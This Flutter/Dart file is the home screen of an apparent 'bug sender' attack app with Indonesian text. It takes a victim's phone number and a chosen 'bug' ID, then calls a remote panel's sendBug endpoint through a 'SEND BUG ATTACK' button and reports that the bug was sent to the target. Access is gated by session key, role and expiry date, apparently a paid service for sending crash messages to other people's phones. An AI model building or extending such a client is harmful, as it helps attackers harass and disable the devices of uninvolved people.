import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  final String baseUrl = "http://adpfreeapi.panel-agil.my.id";
  late AnimationController _controller;
  String selectedBugId = "";

  @override
  void initState() {
    super.initState();
    _controller = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);

    if (widget.listBug.isNotEmpty) {
      selectedBugId = widget.listBug[0]['bug_id'];
    }
  }

  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d]'), '');
    if (cleaned.startsWith('0') || cleaned.length < 8) return null;
    return cleaned;
  }

  Future<void> _sendBug() async {
    final rawInput = targetController.text.trim();
    final target = formatPhoneNumber(rawInput);
    final key = widget.sessionKey;

    if (target == null || key.isEmpty) {
      _showAlert(
        "❌ Invalid Number",
        "Gunakan nomor internasional (misal: +62, 1, 44), bukan 08xxx.",
      );
      return;
    }

    try {
      final res = await http.get(
        Uri.parse(
          "$baseUrl/sendBug?key=$key&target=$target&bug=$selectedBugId",
        ),
      );

      final data = jsonDecode(res.body);

      if (data["cooldown"] == true) {
        _showAlert(
          "⏳ Cooldown",
          "Tunggu beberapa saat sebelum mengirim lagi.",
        );
      } else if (data["valid"] == false) {
        _showAlert(
          "❌ Key Invalid",
          "Session key tidak valid. Silakan login ulang.",
        );
      } else if (data["sended"] == false) {
        _showAlert(
          "⚠️ Gagal",
          "Gagal mengirim bug. Mungkin server sedang maintenance.",
        );
      } else {
        _showAlert(
          "✅ Berhasil",
          "Bug berhasil dikirim ke $target.",
        );
      }
    } catch (_) {
      _showAlert(
        "❌ Error",
        "Terjadi kesalahan. Coba lagi.",
      );
    }
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: Colors.black,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
        ),
        title: Text(
          title,
          style: const TextStyle(
            color: Colors.grey,
            fontFamily: 'Orbitron',
          ),
        ),
        content: Text(
          msg,
          style: const TextStyle(
            color: Colors.white70,
            fontFamily: 'ShareTechMono',
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text(
              "OK",
              style: TextStyle(color: Colors.grey),
            ),
          )
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      decoration: const BoxDecoration(
        gradient: LinearGradient(
          colors: [Colors.black, Colors.black],
          begin: Alignment.topCenter,
          end: Alignment.bottomCenter,
        ),
      ),
      child: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.all(20),
          child: Column(
            children: [

              // === HEADER CARD ===
              Container(
                padding: const EdgeInsets.all(18),
                decoration: BoxDecoration(
                  borderRadius: BorderRadius.circular(20),
                  color: Colors.white.withOpacity(0.05),
                  border: Border.all(
                    color: Colors.grey,
                    width: 1.2,
                  ),
                  boxShadow: [
                    BoxShadow(
                      color: Colors.grey.withOpacity(0.5),
                      blurRadius: 15,
                      spreadRadius: -3,
                    )
                  ],
                ),
                child: Column(
                  children: [
                    FadeTransition(
                      opacity: Tween(
                        begin: 0.5,
                        end: 1.0,
                      ).animate(_controller),
                      child: ClipOval(
                        child: Image.asset(
                          'assets/images/logo.jpg',
                          width: 100,
                          height: 100,
                          fit: BoxFit.cover,
                        ),
                      ),
                    ),

                    const SizedBox(height: 12),

                    Text(
                      widget.username,
                      style: const TextStyle(
                        color: Colors.grey,
                        fontFamily: 'Orbitron',
                        fontWeight: FontWeight.bold,
                        fontSize: 20,
                        letterSpacing: 1.2,
                      ),
                    ),

                    Text(
                      "Role: ${widget.role.toUpperCase()} • Exp: ${widget.expiredDate}",
                      style: const TextStyle(
                        color: Colors.white70,
                        fontFamily: 'ShareTechMono',
                        fontSize: 13,
                      ),
                    ),
                  ],
                ),
              ),

              const SizedBox(height: 30),

              // === FORM CONTAINER ===
              Container(
                padding: const EdgeInsets.all(20),
                decoration: BoxDecoration(
                  color: Colors.white.withOpacity(0.04),
                  borderRadius: BorderRadius.circular(20),
                  border: Border.all(
                    color: Colors.grey,
                  ),
                ),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [

                    const Text(
                      "Target Number",
                      style: TextStyle(
                        color: Colors.grey,
                        fontFamily: 'Orbitron',
                        fontWeight: FontWeight.bold,
                        fontSize: 16,
                      ),
                    ),

                    const SizedBox(height: 10),

                    TextField(
                      controller: targetController,
                      style: const TextStyle(
                        color: Colors.white,
                      ),
                      cursorColor: Colors.grey,
                      decoration: InputDecoration(
                        hintText: "e.g. +62xxxxxxxxx",
                        hintStyle: const TextStyle(
                          color: Colors.grey,
                        ),
                        filled: true,
                        fillColor: Colors.black45,

                        enabledBorder: OutlineInputBorder(
                          borderSide: const BorderSide(
                            color: Colors.grey,
                          ),
                          borderRadius: BorderRadius.circular(16),
                        ),

                        focusedBorder: OutlineInputBorder(
                          borderSide: const BorderSide(
                            color: Colors.white,
                          ),
                          borderRadius: BorderRadius.circular(16),
                        ),
                      ),
                    ),

                    const SizedBox(height: 25),

                    const Text(
                      "Select Bug",
                      style: TextStyle(
                        color: Colors.grey,
                        fontFamily: 'Orbitron',
                        fontWeight: FontWeight.bold,
                        fontSize: 16,
                      ),
                    ),

                    const SizedBox(height: 10),

                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 16),
                      decoration: BoxDecoration(
                        color: Colors.black45,
                        borderRadius: BorderRadius.circular(16),
                        border: Border.all(
                          color: Colors.grey,
                          width: 1.2,
                        ),
                      ),

                      child: DropdownButtonHideUnderline(
                        child: DropdownButton<String>(
                          dropdownColor: Colors.black,
                          value: selectedBugId,
                          isExpanded: true,
                          iconEnabledColor: Colors.grey,
                          style: const TextStyle(
                            color: Colors.white,
                          ),

                          items: widget.listBug.map((bug) {
                            return DropdownMenuItem<String>(
                              value: bug['bug_id'],
                              child: const Text(
                                "bug_name",
                                style: TextStyle(
                                  color: Colors.grey,
                                ),
                              ),
                            );
                          }).toList(),

                          onChanged: (value) {
                            setState(() {
                              selectedBugId = value!;
                            });
                          },
                        ),
                      ),
                    ),
                  ],
                ),
              ),

              const SizedBox(height: 35),

              // === SEND BUTTON ===
              SizedBox(
                width: double.infinity,
                child: ElevatedButton.icon(
                  onPressed: _sendBug,

                  icon: const Icon(
                    Icons.bug_report,
                    color: Colors.white,
                  ),

                  label: const Text(
                    "SEND BUG ATTACK",
                    style: TextStyle(
                      fontSize: 18,
                      fontFamily: 'Orbitron',
                      fontWeight: FontWeight.bold,
                      letterSpacing: 1.4,
                      color: Colors.white,
                    ),
                  ),

                  style: ElevatedButton.styleFrom(
                    padding: const EdgeInsets.symmetric(vertical: 16),
                    backgroundColor: Colors.transparent,
                    shadowColor: Colors.grey,
                    elevation: 6,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(18),
                    ),
                  ).copyWith(
                    backgroundColor:
                        WidgetStateProperty.resolveWith<Color>(
                      (states) {
                        if (states.contains(WidgetState.pressed)) {
                          return Colors.grey.shade700;
                        }
                        return Colors.grey.shade800;
                      },
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  @override
  void dispose() {
    _controller.dispose();
    targetController.dispose();
    super.dispose();
  }
}